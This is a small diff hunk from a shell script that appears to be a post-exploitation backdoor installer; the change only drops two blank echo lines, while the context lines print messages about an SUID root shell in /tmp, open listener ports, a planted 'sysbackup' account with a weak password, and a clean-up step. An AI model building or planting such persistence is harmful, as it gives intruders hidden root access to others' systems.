@@ -115,12 +115,10 @@ sleep 1
 echo "[!] -> /tmp/rootbash -p <- for suid backdoor"
 sleep 1
 echo "[!] Open listeners:"
-echo ""
 sleep 1
 echo -e "\033[96m[+] 1337 4444 5555\033[0m"
 sleep 1
 echo -e "\033[96m[+] Login with sysbackup:Password123!\033[0m"
-echo ""
 sleep 1 
 echo "[*]  clean up..."
 sleep 1 
